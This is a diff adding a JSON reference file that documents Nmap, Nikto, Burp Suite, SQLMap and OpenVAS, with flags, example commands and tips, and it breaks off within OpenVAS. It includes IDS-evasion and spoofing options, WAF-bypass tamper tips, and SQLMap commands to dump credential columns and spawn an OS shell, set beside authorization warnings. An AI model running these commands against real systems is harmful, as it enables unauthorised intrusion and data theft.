@@ -1,0 +1,1725 @@
+[
+    {
+        "name": "Nmap",
+        "description": "Nmap (Network Mapper) is one of the most widely used open-source network scanning and reconnaissance tools. It was originally created by Gordon Lyon (Fyodor) and has become an essential tool for network administrators, penetration testers, and security professionals. Nmap works by sending specially crafted packets to target hosts and analyzing the responses to determine which hosts are alive, what services they are running, which versions of those services are in use, and even which operating systems are present. It can also detect firewalls, intrusion detection/prevention systems, and vulnerabilities. Because of its flexibility and wide range of scanning techniques, Nmap is often considered the \"Swiss Army knife\" of network scanning.",
+        "when_why": "Nmap is typically used during the reconnaissance and scanning phases of cybersecurity assessments, penetration tests, or vulnerability analyses. In reconnaissance, it helps identify which devices are connected to a network (host discovery) and what entry points (open ports and services) might be available. In vulnerability analysis, it provides information about outdated or misconfigured services that could be exploited. System administrators also use it for auditing: to ensure no unauthorized services are running and to verify firewall configurations. Essentially, Nmap helps assess the network’s \"attack surface\" — the set of possible points attackers might target. This makes it equally valuable for offense (ethical hacking, red teaming) and defense (blue teaming, network hardening).",
+        "how": "To use Nmap, you typically run it from the command line. For example: `nmap -sS -sV -T4 192.168.1.1`. In this case, `-sS` initiates a SYN scan (stealthy and efficient), `-sV` tries to detect versions of the services running, and `-T4` sets the timing to \"aggressive\" for faster results. The IP `192.168.1.1` is the target. Scans can be run against single hosts, ranges (192.168.1.1-100), or entire subnets (192.168.1.0/24). Always remember that scanning a network without explicit permission is considered illegal and unethical. A good practice is to test on your own lab network or machines you are authorized to audit.",
+        "notes": "⚠️ Legal and ethical considerations are extremely important. Unauthorized scanning of systems you do not own or manage can be considered illegal hacking activity and may result in disciplinary or legal consequences. Always obtain written permission (such as a \"Rules of Engagement\" document in professional penetration testing). For safe learning, use isolated environments such as virtual labs, Capture the Flag (CTF) platforms, or intentionally vulnerable machines (like Metasploitable).",
+        "flags": [
+            {
+                "flag": "-sV",
+                "explanation": "Version detection: After discovering an open port, Nmap probes it with a variety of requests and analyzes the responses to determine the service and version number (e.g., Apache httpd 2.4.41, OpenSSH 8.0). Why: Knowing exact versions helps security analysts check for specific vulnerabilities associated with that version."
+            },
+            {
+                "flag": "-sS",
+                "explanation": "SYN scan: Also called a \"half-open\" scan because it sends SYN packets and waits for responses without completing the TCP handshake. Why: This is faster and stealthier compared to full connect scans, making it one of the most common techniques in reconnaissance. Many IDS/IPS systems log fewer alerts from SYN scans than from full connections."
+            },
+            {
+                "flag": "-sN",
+                "explanation": "TCP Null scan: Sends TCP packets with no flags set at all. Why: Exploits quirks in how different operating systems handle unexpected packets. Some firewalls or filtering devices may not detect these packets properly, allowing hidden ports to be discovered."
+            },
+            {
+                "flag": "-sT",
+                "explanation": "TCP Connect scan: Completes the full TCP handshake (SYN → SYN-ACK → ACK). Why: This scan is more \"noisy\" and easier to detect, but it works even when you don’t have root/administrator privileges (since SYN scans often require elevated privileges). Used when stealth is less important but accuracy is critical."
+            },
+            {
+                "flag": "-sU",
+                "explanation": "UDP scan: Sends packets to detect services running on UDP ports (e.g., DNS on 53, SNMP on 161, TFTP, DHCP). Why: Many critical services use UDP, and they might go unnoticed if only TCP scans are used. However, UDP scanning is slower and more resource-intensive because of how UDP works (no handshake mechanism)."
+            },
+            {
+                "flag": "-T4",
+                "explanation": "Timing template: Nmap allows you to adjust scan speed using templates from 0 (paranoid, extremely slow) to 5 (insane, maximum speed). -T4 is a good balance for fast scans on stable networks. Why: Faster scans save time, but they also generate more traffic, making them easier to detect and potentially impacting the target system performance."
+            },
+            {
+                "flag": "-O",
+                "explanation": "OS detection: Analyzes responses to different probes (TCP/IP fingerprinting) to guess the operating system and sometimes the exact version (e.g., Windows 10, Ubuntu 20.04). Why: Identifying the OS helps attackers choose exploits tailored to that platform, and defenders can verify which OSes are running on their network."
+            },
+            {
+                "flag": "-A",
+                "explanation": "Aggressive scan: Combines several advanced features in one: OS detection, version detection, default scripts, and traceroute. Why: Provides a detailed, all-in-one report. However, it is very noisy and easily detected by security systems, so it’s better for lab use or when stealth is not required."
+            },
+            {
+                "flag": "-p-",
+                "explanation": "Port range scan: By default, Nmap scans the 1000 most common ports. Using -p- forces it to check all 65,535 possible ports. Why: Ensures you don’t miss services running on unusual or high-numbered ports (e.g., custom web apps on 8080, backdoors on random ports)."
+            },
+            {
+                "flag": "--script=vuln",
+                "explanation": "Nmap Scripting Engine (NSE): Runs prebuilt vulnerability detection scripts against the target. Why: Automates checks for known vulnerabilities such as Heartbleed, SMB exploits, or misconfigurations. Great for quick vulnerability assessments but should not replace dedicated vulnerability scanners."
+            },
+            {
+                "flag": "-oN <file>",
+                "explanation": "Normal output: Saves results to a plain text file. Why: Easy for humans to read, useful for record-keeping and reporting."
+            },
+            {
+                "flag": "-oX <file>",
+                "explanation": "XML output: Saves scan results in structured XML format. Why: Useful for integration with other tools, parsers, or custom scripts that process the results automatically."
+            },
+            {
+                "flag": "-oG <file>",
+                "explanation": "Grepable output: Saves results in a format that can be easily searched or filtered using command-line tools like grep or awk. Why: Speeds up parsing and automation when working with large networks."
+            }
+        ],
+        "examples": [
+            {
+                "command": "nmap -sP 192.168.1.0/24",
+                "explanation": "Performs a \"ping scan\" across an entire subnet. It does not scan for ports or services, only checks which hosts are up. Useful as a first step to identify active devices on a network."
+            },
+            {
+                "command": "nmap -p 22,80 -sV 192.168.1.10",
+                "explanation": "Scans for two specific ports (22 for SSH, 80 for HTTP) and attempts to identify the version of the services running on those ports. Useful for targeted scans when you know which services to check."
+            },
+            {
+                "command": "nmap -sU -T3 192.168.1.15",
+                "explanation": "Performs a UDP scan with moderate timing (T3). Helps identify UDP-based services such as DNS, SNMP, or TFTP on a single host without overwhelming the network."
+            },
+            {
+                "command": "nmap -p- --script=vuln -oN vuln_scan.txt 192.168.1.20",
+                "explanation": "Scans all 65,535 ports, runs vulnerability detection scripts, and saves the results into a text file named vuln_scan.txt. Provides a comprehensive look at possible weaknesses."
+            },
+            {
+                "command": "nmap -A 10.0.0.5",
+                "explanation": "Runs an aggressive scan that includes OS detection, service version detection, traceroute, and default scripts. Great for in-depth analysis of a single host, but very noisy on the network."
+            }
+        ],
+        "tips": {
+            "list_scripts": "Nmap comes with hundreds of NSE scripts for tasks like brute-forcing, vulnerability detection, malware discovery, and more. To see available scripts on Linux, run: ls /usr/share/nmap/scripts/",
+            "get_script_help": "To see what a script does before running it, use: nmap --script-help=<script-name>. This provides usage details, author information, and categories (e.g., \"auth\", \"vuln\", \"brute\")."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Ports reported as \"filtered\" indicate that Nmap cannot determine if they are open or closed, usually because a firewall is blocking the probes. To investigate further, use ACK scans (-sA), NULL scans (-sN), or XMAS scans (-sX) to analyze firewall behavior.",
+                "Combine multiple scan techniques for better accuracy (e.g., SYN scan followed by version detection).",
+                "Understand that evasive techniques (decoys, fragmentation, spoofing) are often detected by intrusion detection systems, so use them cautiously in professional settings."
+            ],
+            "tips": [
+                "Use decoys with -D: Example: nmap -D RND:5 target.com. This sends traffic that makes it appear as if multiple IP addresses are scanning the target, helping hide the real source.",
+                "Fragment packets with -f: Example: nmap -f target.com. Splits probe packets into smaller fragments to bypass simple packet filters or firewalls. However, this may slow down the scan.",
+                "Spoof MAC address: Example: nmap --spoof-mac 00:11:22:33:44:55 target.com. Masks your real hardware identity with a fake MAC address, useful for bypassing filters tied to MACs.",
+                "Randomize host order: Example: nmap --randomize-hosts -iL targets.txt. Instead of scanning targets sequentially, Nmap randomizes the order to make it harder for defenders to predict your scanning pattern."
+            ]
+        }
+    },
+    {
+        "name": "Nikto",
+        "description": "Nikto is an open-source web server scanner that automates the process of checking web servers for known vulnerabilities and misconfigurations. It tests for over 6,700 potentially dangerous files/CGIs, outdated or vulnerable software versions, insecure HTTP headers, default files or installations, and various server misconfigurations. Unlike general-purpose vulnerability scanners, Nikto focuses specifically on web servers and their associated technologies. It does not attempt to exploit vulnerabilities; instead, it identifies them so administrators and testers can remediate issues before attackers do.",
+        "when_why": "Nikto is used during the vulnerability scanning phase of a penetration test or security assessment. It helps identify weaknesses in web servers such as:\n- Outdated web server software (e.g., Apache, Nginx, IIS) that might contain known vulnerabilities.\n- Dangerous or default files (e.g., phpinfo.php, test.php, sample scripts).\n- Potential injection points (SQL, command, or local file inclusion).\n- Misconfigured servers (e.g., directory listing enabled, missing security headers, SSL/TLS misconfigurations).\nBy running Nikto, security teams can harden web infrastructure by addressing these issues early. Web servers are often the first point of contact exposed to the internet, making them high-value targets for attackers.",
+        "how": "To run Nikto, you use it from the command line. A typical usage example is: `nikto -h http://192.168.1.100 -T 35 -o report.txt`. Here, `-h` specifies the target host, `-T 35` tunes the scan to look for misconfigurations and SQL injection vulnerabilities, and `-o report.txt` saves the scan results into a file. You can also specify output formats (e.g., HTML or XML) for reporting. ⚠️ Important: Nikto is very noisy, meaning it generates a lot of HTTP requests that are easily detected by intrusion detection systems (IDS) and web application firewalls (WAFs). It is not a stealth tool. Use only on systems you own or are explicitly authorized to test.",
+        "notes": "⚠️ Legal and ethical considerations apply: Scanning systems without permission is considered unauthorized access and may be illegal. Because Nikto sends thousands of requests during scans, it can trigger alerts, overwhelm weak servers, or cause logs to fill rapidly. Best practice: Run it in controlled environments (e.g., penetration testing labs, authorized client networks) and combine it with other tools for a complete security assessment.",
+        "flags": [
+            {
+                "flag": "-h",
+                "explanation": "Target host: Specifies the web server to scan (e.g., http://192.168.1.100). Can be an IP address, domain name, or even a file containing a list of hosts. This is the most essential option since Nikto needs to know where to direct its tests."
+            },
+            {
+                "flag": "-T",
+                "explanation": "Tuning: Allows you to specify scan categories using numeric IDs (e.g., -T 35 runs checks for misconfigurations (3) and SQL injection (5)). Why: Speeds up scanning and focuses on specific vulnerability types instead of running all checks, which can save time and reduce noise."
+            },
+            {
+                "flag": "-o",
+                "explanation": "Output file: Saves scan results to a file. Example: -o report.txt. Why: Helpful for documentation, later review, or when generating reports for clients or professors in a classroom/lab setting."
+            },
+            {
+                "flag": "-Format",
+                "explanation": "Output format: Lets you choose how the results are saved (txt, csv, html, nbe, xml). Why: Different formats are useful in different contexts: text for reading, CSV for spreadsheets, HTML for formatted reports, and XML for importing into other security tools."
+            },
+            {
+                "flag": "-evasion",
+                "explanation": "IDS/IPS/WAF evasion: Applies techniques such as encoding requests, inserting extra characters, or altering request order. Why: Useful for testing how well an organization’s intrusion detection or prevention systems handle obfuscated malicious traffic. Example: -evasion 1 applies the first evasion technique."
+            },
+            {
+                "flag": "-Plugins",
+                "explanation": "Specify which plugins to run. Example: -Plugins \"apache(2);headers\". Why: This allows you to run only targeted checks (e.g., Apache vulnerabilities, header checks) instead of the full database, which can make scans more efficient and focused."
+            },
+            {
+                "flag": "-p",
+                "explanation": "Port: Specify a custom port instead of the default (80 for HTTP, 443 for HTTPS). Example: -p 8080. Why: Many web applications run on non-standard ports (e.g., Tomcat on 8080, proxy interfaces on 3128). Ensures those services are scanned too."
+            },
+            {
+                "flag": "-ssl",
+                "explanation": "Force SSL: Ensures Nikto connects over HTTPS instead of plain HTTP. Example: -ssl https://target.com. Why: Important for scanning secured web applications that only accept encrypted traffic. Also helps test SSL/TLS-related issues."
+            }
+        ],
+        "examples": [
+            {
+                "command": "nikto -h http://192.168.1.100",
+                "explanation": "Performs a basic scan of a web server over HTTP, checking for default files, outdated software, and common misconfigurations."
+            },
+            {
+                "command": "nikto -h https://192.168.1.100 -p 8443 -ssl",
+                "explanation": "Scans a secure web server running on port 8443 using HTTPS. Useful for web applications that are not hosted on the default port 443."
+            },
+            {
+                "command": "nikto -h http://192.168.1.100 -T 9 -o scan.txt -Format txt",
+                "explanation": "Scans only for \"interesting files/CGIs\" using tuning ID 9 and saves the results in a plain text file. This is faster and more focused than a full scan."
+            },
+            {
+                "command": "nikto -h http://192.168.1.100 -Plugins \"apache(2)\"",
+                "explanation": "Runs only Apache-specific plugin checks. This is helpful when you know the target is an Apache server and want a focused assessment."
+            },
+            {
+                "command": "nikto -h http://test.site -evasion 1",
+                "explanation": "Uses the first IDS evasion technique to obfuscate requests. This can test how well the target’s IDS/WAF detects and responds to disguised scanning activity."
+            }
+        ],
+        "tips": {
+            "update_database": "Nikto relies on its vulnerability database. Keep it updated with: perl nikto.pl -update. This ensures it can detect the latest issues.",
+            "combine_with_proxy": "Run Nikto through an intercepting proxy like Burp Suite to analyze requests and responses in more detail.",
+            "schedule_scans": "Nikto can be automated with cron jobs or scripts to run regularly against your servers, helping detect new misconfigurations over time.",
+            "log_analysis": "Always check web server logs after a Nikto scan to understand how much \"noise\" it generates and how defenders could detect such scans."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Combine Nikto with Nmap: Run Nmap first to discover open web ports, then feed those into Nikto for detailed web-specific analysis.",
+                "Use Nikto with Metasploit: Results from Nikto can identify attack vectors that can be tested further with exploitation frameworks.",
+                "Bypass WAFs: Use -evasion options to test how different encoding/obfuscation techniques affect detection. Example: multiple evasion numbers can be chained.",
+                "Chain with SSL/TLS tools: Nikto can detect some SSL misconfigs, but using it together with SSLyze or OpenSSL commands gives deeper insight.",
+                "Run against virtual hosts: Many web servers host multiple domains on one IP. Use the -vhost flag (e.g., -vhost example.com) to scan the correct virtual host."
+            ],
+            "tips": [
+                "Parallel scans: Use external scripts or GNU parallel to scan multiple hosts at once when testing large networks.",
+                "Scan behind authentication: Nikto does not handle authenticated sessions well, but pairing it with tools like Burp or OWASP ZAP allows deeper scanning.",
+                "Custom plugin creation: Nikto’s plugins are written in Perl. Advanced users can create their own plugins to check for custom files or organization-specific misconfigurations."
+            ]
+        }
+    },
+    {
+        "name": "Burp Suite",
+        "description": "Burp Suite is a powerful framework for web application security testing. It acts as a man-in-the-middle proxy between your browser and the target web server, allowing you to intercept, inspect, modify, and replay HTTP(S) traffic. Burp helps identify and exploit common vulnerabilities such as SQL Injection (SQLi), Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), insecure cookies, session mismanagement, and misconfigured authentication. Burp Suite has both a Community Edition (free) and a Professional Edition (with automated scanning, advanced features, and extensions).",
+        "when_why": "Use Burp Suite when performing penetration tests, bug bounty hunting, or general web application security assessments. It is most useful when you need to:\n- Intercept and analyze live HTTP/HTTPS traffic.\n- Modify and replay requests to test input validation and business logic.\n- Automate scanning for vulnerabilities (Pro only).\n- Perform brute-force, fuzzing, or parameter manipulation with Intruder.\n- Reuse or chain requests with Repeater and Sequencer.\n- Extend functionality with BApps (Burp extensions).\n\nAlways use Burp Suite responsibly and only against applications you are authorized to test.",
+        "notes": "⚠️ Legal and ethical considerations are extremely important. Unauthorized scanning of systems you do not own or manage can be considered illegal hacking activity and may result in disciplinary or legal consequences. Always obtain written permission (such as a \"Rules of Engagement\" document in professional penetration testing). For safe learning, use isolated environments such as virtual labs, Capture the Flag (CTF) platforms, or intentionally vulnerable machines (like Metasploitable).",
+        "how": "1. Launch Burp Suite with `burpsuite`.\n2. Go to the **Proxy** tab → Options → confirm that Proxy Listener is active on 127.0.0.1:8080.\n3. Configure your browser (or use Burp’s embedded Chromium browser) to proxy traffic through 127.0.0.1:8080.\n4. (Optional) Import Burp’s CA certificate into your browser to intercept HTTPS traffic without warnings.\n5. Visit the target web app through the proxy-enabled browser — requests will appear under Proxy → Intercept.\n6. Forward, drop, or modify requests, then explore other tabs:\n   - **Target**: Site map and scope management.\n   - **Repeater**: Craft and resend requests manually.\n   - **Intruder**: Automate attacks such as fuzzing, brute force, or parameter injection.\n   - **Scanner (Pro)**: Automated vulnerability scanning.\n   - **Sequencer**: Analyze session tokens for randomness.\n   - **Decoder**: Encode/decode payloads (Base64, URL, hex, etc.).\n   - **Comparer**: Compare requests/responses to identify subtle differences.\n   - **Extender**: Add community/pro extensions (BApp Store).\n7. Save your project frequently when working on long engagements.\n\n⚠️ Ethical reminder: Only intercept and test traffic for apps you own or have explicit authorization to assess.",
+        "flags": [
+            {
+                "flag": "--project-file=<file>",
+                "explanation": "Open or create a project file to save all captured requests, configurations, and findings. Example: `burpsuite --project-file=mytest.burp`"
+            },
+            {
+                "flag": "--config-file=<file>",
+                "explanation": "Load a specific configuration file (e.g., proxy settings, UI layout, scanning options). Example: `burpsuite --config-file=settings.json`"
+            },
+            {
+                "flag": "--user-config-file=<file>",
+                "explanation": "Load personal user preferences such as hotkeys, themes, or proxy defaults."
+            },
+            {
+                "flag": "--unpause-spider-and-scanner",
+                "explanation": "Automatically unpauses the Spider and Scanner when starting Burp (Pro only)."
+            },
+            {
+                "flag": "--use-defaults",
+                "explanation": "Ignore previous configurations and launch Burp with default settings."
+            },
+            {
+                "flag": "--collaborator-server=<url>",
+                "explanation": "Specify a custom Burp Collaborator server for out-of-band testing (useful for advanced SSRF/XSS detection)."
+            },
+            {
+                "flag": "--disable-extensions",
+                "explanation": "Start Burp without loading extensions (useful for troubleshooting)."
+            }
+        ],
+        "examples": [
+            {
+                "command": "burpsuite",
+                "explanation": "Start Burp Suite with default settings (Community or Pro)."
+            },
+            {
+                "command": "burpsuite --project-file=bank_test.burp",
+                "explanation": "Resume testing a previously saved project file."
+            },
+            {
+                "command": "burpsuite --config-file=burp_config.json",
+                "explanation": "Launch Burp with a predefined configuration (proxy/scanner settings)."
+            },
+            {
+                "command": "burpsuite --unpause-spider-and-scanner",
+                "explanation": "Automatically begin crawling and scanning as soon as Burp starts (Pro only)."
+            },
+            {
+                "command": "burpsuite --collaborator-server=collab.myserver.com",
+                "explanation": "Use a custom Burp Collaborator server for external interaction tests (e.g., blind XSS/SSRF)."
+            }
+        ],
+        "tips": {
+            "Setup": "Install the Burp CA certificate in your browser to properly intercept HTTPS traffic without SSL warnings.",
+            "Scope Management": "Define target scope early to avoid clutter and prevent accidentally testing unrelated domains.",
+            "Intruder Payloads": "Use payload lists (wordlists, fuzzing strings, brute-force dictionaries) to expand Intruder attacks.",
+            "Repeater Use": "Repeater is ideal for testing small input variations or confirming vulnerabilities manually.",
+            "BApp Store": "Explore the BApp Store for extensions (e.g., JSON Beautifier, ActiveScan++)."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Use Burp Collaborator to detect blind vulnerabilities such as SSRF, XXE, and out-of-band XSS.",
+                "Leverage Burp extensions (written in Java, Python, or Ruby) to create custom automation for repetitive tasks.",
+                "Chain Burp Suite with external tools (like SQLMap or OWASP ZAP) by exporting requests from Proxy or Repeater.",
+                "Utilize macros and session handling rules to maintain authenticated sessions when testing apps that log you out frequently.",
+                "Customize Intruder attack types (Sniper, Battering Ram, Pitchfork, Cluster Bomb) to match the scenario.",
+                "Integrate Burp Suite with CI/CD pipelines for automated security testing (Pro/Enterprise).",
+                "For large engagements, use project files with disk-based storage instead of memory to avoid performance issues."
+            ],
+            "tips": [
+                "Keyboard shortcuts (e.g., Ctrl+Shift+R for Repeater) can significantly speed up workflows.",
+                "Save project snapshots often during long tests to avoid data loss.",
+                "Group requests in the Target tab for better navigation during complex engagements.",
+                "Use Comparer to identify subtle parameter differences in requests/responses.",
+                "Decoder can quickly encode/decode payloads while crafting exploit strings."
+            ]
+        }
+    },
+    {
+        "name": "SQLMap",
+        "description": "SQLMap is a powerful open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities. It supports multiple database management systems (DBMS) including MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, and more. SQLMap can enumerate databases, extract tables and columns, dump sensitive data, access the underlying file system, and even gain remote shell access in certain scenarios. It is widely used by penetration testers, bug bounty hunters, and security researchers.",
+        "when_why": "Use SQLMap when assessing web applications that interact with databases, especially if you suspect SQL injection flaws. SQL injection is one of the OWASP Top 10 most critical vulnerabilities, as it can allow attackers to:\n- Extract or modify sensitive data (usernames, passwords, financial data).\n- Bypass authentication or escalate privileges.\n- Interact with the underlying file system.\n- Execute operating system commands in certain cases.\n\nSQLMap saves time by automating payload generation, testing multiple injection techniques, and handling complex injection scenarios that would be tedious to exploit manually.",
+        "notes": "⚠️ Legal and ethical considerations are extremely important. Unauthorized scanning of systems you do not own or manage can be considered illegal hacking activity and may result in disciplinary or legal consequences. Always obtain written permission (such as a \"Rules of Engagement\" document in professional penetration testing). For safe learning, use isolated environments such as virtual labs, Capture the Flag (CTF) platforms, or intentionally vulnerable machines (like Metasploitable).",
+        "how": "Basic usage:\n`sqlmap -u \"http://192.168.1.100/page.php?id=1\" --dbs --batch`\n\nIf authentication is required, include cookies:\n`sqlmap -u \"http://192.168.1.100/page.php?id=1\" --cookie=\"PHPSESSID=abc123; security=high\" --dbs --batch`\n\nExplanation of core options:\n- `-u`: Target URL with a suspected injectable parameter.\n- `--cookie`: Passes session cookies for authenticated scans.\n- `--level`: Increases the depth of testing (default is 1, max is 5).\n- `--risk`: Sets how intrusive/aggressive the tests are (1–3).\n- `--dbs`: Enumerates available databases.\n- `--batch`: Non-interactive mode (useful for automation).\n\n⚠️ Always test only with explicit authorization and never against systems you do not own.",
+        "flags": [
+            {
+                "flag": "--level=5",
+                "explanation": "Sets the thoroughness of testing (1-5). Level 5 tests more parameters and injection points. Example: `sqlmap -u URL --level=5` Why: More detailed but slower scans."
+            },
+            {
+                "flag": "--risk=3",
+                "explanation": "Defines how aggressive the tests are (1-3). Risk 3 enables advanced tests like time-based injections. Example: `sqlmap -u URL --risk=3` Why: Detects deeper vulnerabilities, but may be more intrusive."
+            },
+            {
+                "flag": "-p",
+                "explanation": "Specifies which parameter to test for injection. Example: `sqlmap -u URL -p id` Why: Focuses testing, making it faster and more efficient."
+            },
+            {
+                "flag": "--batch",
+                "explanation": "Runs SQLMap without prompting for user input, using default answers. Example: `sqlmap -u URL --batch` Why: Enables automated scans or scripting."
+            },
+            {
+                "flag": "--cookie",
+                "explanation": "Send HTTP cookies along with requests. Example: `sqlmap -u URL --cookie=\"SESSIONID=xyz; logged_in=true\"` Why: Needed for authenticated scans or to maintain session state."
+            },
+            {
+                "flag": "--os-shell",
+                "explanation": "Attempt to gain a command shell on the underlying operating system (if possible). Example: `sqlmap -u URL --os-shell`. Why: Post-exploitation to demonstrate full compromise."
+            },
+            {
+                "flag": "--dump",
+                "explanation": "Extracts (dumps) database entries from specified tables or columns. Example: `sqlmap -u URL -D database_name -T users -C username,password --dump`. Why: Retrieve actual stored data once injection is confirmed."
+            },
+            {
+                "flag": "--threads=10",
+                "explanation": "Enable multi-threading to speed up testing. Example: `sqlmap -u URL --threads=10`. Why: Faster scans, but can increase load on the target."
+            },
+            {
+                "flag": "--crawl=3",
+                "explanation": "Crawl the target site to discover URLs up to the given depth. Example: `sqlmap -u http://target.com --crawl=3`. Why: Expands coverage automatically."
+            },
+            {
+                "flag": "--schema",
+                "explanation": "Enumerates the database schema (databases, tables, columns). Example: `sqlmap -u URL --schema`. Why: Map the structure of the database before dumping."
+            },
+            {
+                "flag": "--tables",
+                "explanation": "Lists all tables in a specific database. Example: `sqlmap -u URL -D database_name --tables`. Why: Narrow down which tables are worth extracting data from."
+            },
+            {
+                "flag": "--columns",
+                "explanation": "Lists all columns in a specific table. Example: `sqlmap -u URL -D database_name -T users --columns`. Why: Identify sensitive columns like username, password, email, etc."
+            }
+        ],
+        "examples": [
+            {
+                "command": "sqlmap -u \"http://192.168.1.100/page.php?id=1\" --dbs --batch",
+                "explanation": "Quickly enumerate all databases on the target URL without interactive prompts."
+            },
+            {
+                "command": "sqlmap -u \"http://192.168.1.100/page.php?id=1\" --level=5 --risk=3 --batch",
+                "explanation": "Perform a thorough and aggressive scan on the target, testing many injection points."
+            },
+            {
+                "command": "sqlmap -u \"http://192.168.1.100/page.php?id=1\" -p id --dump --batch",
+                "explanation": "Focus testing on the \"id\" parameter and dump the database content if injectable."
+            },
+            {
+                "command": "sqlmap -u \"http://192.168.1.100/page.php?id=1\" --cookie=\"PHPSESSID=abc123; security=high\" --dbs --batch",
+                "explanation": "Scan a target that requires authentication via cookies to access restricted pages."
+            },
+            {
+                "command": "sqlmap -u \"http://target.com/index.php\" --os-shell --batch",
+                "explanation": "Attempt to spawn an interactive operating system shell if injection allows it."
+            },
+            {
+                "command": "sqlmap -u \"http://target.com/\" --crawl=3 --batch",
+                "explanation": "Crawl the website up to 3 levels deep to automatically find injectable URLs."
+            },
+            {
+                "command": "sqlmap -u \"http://target.com/page.php?id=1\" --schema",
+                "explanation": "Enumerate the database schema (databases, tables, columns)."
+            },
+            {
+                "command": "sqlmap -u \"http://target.com/page.php?id=1\" -D mydb --tables",
+                "explanation": "List all tables inside the \"mydb\" database."
+            },
+            {
+                "command": "sqlmap -u \"http://target.com/page.php?id=1\" -D mydb -T users --columns",
+                "explanation": "Enumerate all columns in the \"users\" table."
+            },
+            {
+                "command": "sqlmap -u \"http://target.com/page.php?id=1\" -D mydb -T users -C username,password --dump",
+                "explanation": "Dump only the username and password columns from the \"users\" table."
+            }
+        ],
+        "tips": {
+            "Authentication": "Use --cookie or --auth-type/--auth-cred for authenticated targets.",
+            "Speed": "Combine --threads with --batch to accelerate testing on large targets.",
+            "Database Focus": "Use -D (database), -T (table), and -C (column) switches to narrow extraction scope.",
+            "Bypass": "Use --random-agent and --tamper scripts to bypass WAF/IDS filtering.",
+            "Logging": "Always save results with -o or --output-dir for reporting."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Use tamper scripts (--tamper) to obfuscate payloads and bypass Web Application Firewalls (WAFs).",
+                "Chain with Burp Suite by exporting requests from Burp into a text file and using --request-file.",
+                "Leverage out-of-band injection techniques with DNS exfiltration using --dns-domain.",
+                "Automate with --crawl and --forms to discover hidden inputs and form parameters.",
+                "Use --technique=BEUSTQ to specify which SQLi techniques to test (Boolean, Error, Union, Stacked, Time, Inline queries).",
+                "Try --os-shell or --os-pwn for advanced exploitation if database privileges allow OS-level interaction."
+            ],
+            "tips": [
+                "Combine --risk=3 with --level=5 for maximum coverage (but expect long runtimes).",
+                "Use --flush-session if SQLMap cached old results for the target.",
+                "Run with --fresh-queries to avoid relying on cached payload results.",
+                "Integrate with wordlists using --common-tables/--common-columns for faster data discovery.",
+                "Use proxy settings (--proxy=\"http://127.0.0.1:8080\") to run SQLMap through Burp or OWASP ZAP for inspection."
+            ]
+        }
+    },
+    {
+        "name": "OpenVAS",
+        "description": "OpenVAS (Open Vulnerability Assessment Scanner), part of the Greenbone Vulnerability Management (GVM) framework, is an open-source vulnerability scanner that identifies security issues across networks, servers, applications, and databases. It continuously updates its vulnerability feed (Greenbone Community Feed / Greenbone Enterprise Feed) to detect thousands of CVEs, misconfigurations, and compliance issues. OpenVAS is widely used for vulnerability management, penetration testing prep, and compliance auditing.",
+        "when_why": "Use OpenVAS when you need a reliable and automated way to detect vulnerabilities across large networks. It is especially useful for:\n- Regular vulnerability scans to identify risks before attackers do.\n- Compliance audits (e.g., PCI DSS, ISO 27001, HIPAA).\n- Security monitoring in continuous integration (CI/CD) pipelines.\n- Prioritizing remediation based on severity (CVSS scoring).\n\nUnlike manual testing, OpenVAS automates large-scale scans, integrates with reporting workflows, and provides actionable remediation guidance.",
+        "how": "Step-by-step usage example:\n1. Initialize OpenVAS with setup:\n`gvm-setup`\n(This downloads vulnerability feeds and configures the scanner.)\n\n2. Start the scanner services:\n`gvm-start`\n\n3. Access the web interface:\n`http://127.0.0.1:9392`\n(Login with your admin credentials; a random password is generated during setup.)\n\n4. Create a new scan task:\n- Define the target (single host, subnet, or range).\n- Select a scan configuration (Full and fast, Full and very deep, etc.).\n- Name your task for easy tracking.\n\n5. Run the scan and monitor via the web interface or CLI.\n\n6. Review detailed reports, filter vulnerabilities by severity, and apply remediation recommendations.\n\n⚠️ Always ensure you have permission before scanning, as scans can disrupt services.",
+        "flags": [
+            {
+                "flag": "gvm-setup",
+                "explanation": "Initializes OpenVAS by downloading the latest vulnerability feeds and configuring services. Run this before first use or after feed updates."
+            },
+            {
+                "flag": "gvm-start",
+                "explanation": "Starts all Greenbone Vulnerability Manager (GVM) services including scanner and web UI."
+            },
+            {
+                "flag": "gvm-stop",
+                "explanation": "Stops all running GVM services gracefully. Use to shut down the scanner."
+            },
+            {
+                "flag": "gvm-cli --pretty",
+                "explanation": "Runs OpenVAS commands via CLI with formatted, human-readable output. Useful for automation or scripting."
+            },
+            {
+                "flag": "gsad --http-only",
+                "explanation": "Launches the Greenbone Security Assistant (GSA) web UI without HTTPS. Safer for local-only environments."
+            },
+            {
+                "flag": "omp -u admin -w password -T",
+                "explanation": "Run OpenVAS Management Protocol commands directly (deprecated but still used). Example: list tasks, reports, or start scans from CLI."
+            },
+            {
+                "flag": "gvmd --get-scans",
+                "explanation": "Lists all available scan configurations. Useful for selecting the right scan type (fast vs. deep)."
+            },
+            {
+                "flag": "gvmd --get-users",
+                "explanation": "List all users in the GVM system. Useful for multi-user management."
+            }
+        ],
+        "examples": [
+            {
+                "command": "gvm-setup",
+                "explanation": "Initialize OpenVAS by setting up feeds and configuring services."
+            },
+            {
+                "command": "gvm-start",
+                "explanation": "Start OpenVAS services and make the web UI accessible."
+            },
+            {
+                "command": "gvm-stop",
+                "explanation": "Stop all services safely when done scanning."
+            },
+            {
+                "command": "gvm-cli --pretty -c \"get_tasks\"",
+                "explanation": "List all existing scan tasks with readable output."
+            },
+            {
+                "command": "gvm-cli --pretty -c \"get_reports\"",
+                "explanation": "Retrieve existing reports directly from CLI in readable format."
+            },
+            {
+                "command": "gvmd --get-scans",
+                "explanation": "List all scan configurations (Full and fast, Full and deep, Host discovery, etc.)."
+            },
+            {
+                "command": "gsad --http-only",
+                "explanation": "Run the web UI without HTTPS (only recommended for testing locally)."
+            },
+            {
+                "command": "gvm-cli socket --xml \"<create_target><name>LocalNet</name><hosts>192.168.1.0/24</hosts></create_target>\"",
+                "explanation": "Create a new scan target (local subnet) directly via CLI."
+            }
+        ],
+        "tips": {
+            "Feed Updates": "Run `greenbone-nvt-sync` (or `gvm-feed-update`) regularly to keep vulnerability checks current.",
